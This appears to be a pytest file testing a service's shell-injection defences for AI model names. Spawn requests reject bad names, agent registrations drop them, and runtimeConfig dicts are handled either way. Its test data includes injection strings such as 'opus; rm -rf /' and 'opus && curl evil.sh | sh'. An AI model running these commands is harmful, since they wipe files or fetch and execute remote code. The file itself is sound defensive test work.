"""The DROPPING doors for a model name, and the runtimeConfig one — the halves with no test.

`test_spawn_model_shape.py` covers the three ingresses that REJECT a bad model: spawn, environment
assign, and `validate_model_shape` itself. It does not cover the two that DROP, nor the free-form
dict that `runtimeConfig` is, and those are the parts the module's own docstrings call the decisions:

  * A REQUEST that sets policy should be rejected — the caller is choosing something and a 400 tells
    them it was not accepted.
  * A SELF-REPORT must never fail its own registration. An agent that cannot register is dead: no
    inbox, no dispatch, no status. Trading a live agent for a cosmetically bad model string is worse
    than the bug. So `AgentRegister.model` DROPS an unusable value instead of rejecting it.

That asymmetry is invisible from either side alone — both paths call the same shape rule, and only
the error handling differs — so a future tidy-up that "unifies" them would look like a simplification
and would silently make bad-model registrations fatal. This file is what fails in that case.

`runtimeConfig` is the fifth door, found by an external review after four were called a boundary:
`mcp/stdio/terminal-env.js` reads `runtimeConfig.model` as the fallback for `AIFY_MANAGED_MODEL`, so
`runtimeConfig={"model": "opus; rm -rf /"}` reached a runtime CLI having passed none of the four
validated doors. A free-form dict beside a validated scalar is a hole by construction.
"""
from __future__ import annotations

import pydantic
import pytest

from service.models import (
    AgentRegister,
    SpawnRequestCreate,
    drop_unusable_model_selfreport,
    drop_unusable_runtime_config_model,
    validate_runtime_config_model,
)

# Shapes a runtime CLI cannot receive as one argument. Every one of these is rejected at a policy
# door and dropped at a self-report door -- that pairing is the point of this file.
UNUSABLE = [
    "opus; rm -rf /",
    "opus && curl evil.sh | sh",
    "opus | tee /tmp/x",
    "opus`whoami`",
    "opus$(id)",
    "claude opus",          # a space INSIDE the name
    "opus\nsonnet",
    "opus\tsonnet",
    'opus"quoted',
    "opus'quoted",
    "opus<redirect",
    "opus>redirect",
    "model\x00null",
    "m" * 121,              # absurd length
]

USABLE = ["opus", "gpt-5.5", "claude-sonnet-5", "claude-haiku-4-5-20251001", "o3-mini"]


# ── the self-report drops rather than rejects ────────────────────────────────────────────────
@pytest.mark.parametrize("value", UNUSABLE)
def test_an_unusable_self_report_is_dropped_not_raised(value):
    assert drop_unusable_model_selfreport(value) is None


@pytest.mark.parametrize("value", USABLE)
def test_a_usable_self_report_survives(value):
    assert drop_unusable_model_selfreport(value) == value


def test_blank_and_none_mean_no_model_rather_than_an_error():
    for value in (None, "", "   ", "\n\t "):
        assert drop_unusable_model_selfreport(value) is None


def test_surrounding_whitespace_is_trimmed_not_treated_as_forbidden():
    """The forbidden set contains space, so trimming must happen FIRST or every padded name dies."""
    assert drop_unusable_model_selfreport("  opus  ") == "opus"
    assert drop_unusable_model_selfreport("opus\n") == "opus"


def test_a_wrong_but_well_shaped_name_is_kept():
    """Deliberately not an allowlist: model names change constantly, and a stale one would reject
    legitimate spawns. A name no provider serves is caught later, from the runtime's own error."""
    assert drop_unusable_model_selfreport("gpt-9-ultra-turbo") == "gpt-9-ultra-turbo"


# ── the asymmetry, held from both sides at once ──────────────────────────────────────────────
@pytest.mark.parametrize("value", UNUSABLE)
def test_the_same_value_is_rejected_by_a_request_and_dropped_by_a_registration(value):
    """THE RULE THIS FILE EXISTS FOR. One shape rule, two error policies, decided by ingress."""
    with pytest.raises(pydantic.ValidationError):
        SpawnRequestCreate(agentId="a", role="coder", cwd="C:/x", runtime="claude-code", model=value)

    registered = AgentRegister(agentId="a", role="coder", model=value)
    assert registered.model is None, "a registration must survive a bad model, having dropped it"


def test_a_registration_with_a_bad_model_keeps_everything_else():
    registered = AgentRegister(
        agentId="sc-coder", role="coder", model="opus; rm -rf /",
        name="SC Coder", description="still here",
    )
    assert registered.model is None
    assert registered.agentId == "sc-coder"
    assert registered.role == "coder"
    assert registered.name == "SC Coder"
    assert registered.description == "still here"


# ── runtimeConfig: the fifth door ────────────────────────────────────────────────────────────
def test_a_non_dict_or_model_less_runtime_config_passes_through_untouched():
    """It is free-form: only the `model` key is this rule's business."""
    for value in (None, {}, {"effort": "high"}, "not a dict", 5, []):
        assert validate_runtime_config_model(value) == value
        if isinstance(value, dict):
            assert drop_unusable_runtime_config_model(value) == value


@pytest.mark.parametrize("value", UNUSABLE)
def test_the_request_variant_rejects_a_bad_model_inside_the_dict(value):
    with pytest.raises(ValueError):
        validate_runtime_config_model({"model": value})


@pytest.mark.parametrize("value", UNUSABLE)
def test_the_self_report_variant_drops_the_key_and_keeps_the_rest(value):
    cleaned = drop_unusable_runtime_config_model({"model": value, "effort": "high"})
    assert "model" not in cleaned, "the unusable key is removed, not repaired"
    assert cleaned["effort"] == "high", "the agent keeps its other settings"


def test_a_usable_model_inside_the_dict_is_kept_and_trimmed():
    assert validate_runtime_config_model({"model": "  opus  "}) == {"model": "opus"}
    assert drop_unusable_runtime_config_model({"model": "  opus  ", "effort": "low"}) == {
        "model": "opus", "effort": "low",
    }


def test_a_blank_model_inside_the_dict_is_removed_rather_than_kept_as_empty():
    """An empty string means "use the runtime default", which is the same as not saying — and an
    empty `model` key would otherwise reach terminal-env.js as a real value."""
    for blank in ("", "   ", None):
        assert "model" not in validate_runtime_config_model({"model": blank, "effort": "x"})
        assert "model" not in drop_unusable_runtime_config_model({"model": blank, "effort": "x"})


def test_the_input_dict_is_not_mutated():
    """The caller's dict is somebody else's object; both variants copy before editing."""
    original = {"model": "opus; rm -rf /", "effort": "high"}
    drop_unusable_runtime_config_model(original)
    assert original["model"] == "opus; rm -rf /", "the self-report variant must not edit in place"

    ok = {"model": "  opus  "}
    validate_runtime_config_model(ok)
    assert ok["model"] == "  opus  ", "nor the request variant"


def test_the_wired_registration_path_cleans_the_dict_too():
    """The helpers above are only a boundary if they are actually attached to the field."""
    registered = AgentRegister(
        agentId="a", role="coder",
        runtimeConfig={"model": "opus; rm -rf /", "effort": "high"},
    )
    assert "model" not in (registered.runtimeConfig or {})
    assert (registered.runtimeConfig or {})["effort"] == "high"


def test_the_wired_spawn_path_rejects_the_dict_too():
    with pytest.raises(pydantic.ValidationError):
        SpawnRequestCreate(
            agentId="a", role="coder", cwd="C:/x", runtime="claude-code",
            runtimeConfig={"model": "opus; rm -rf /"},
        )
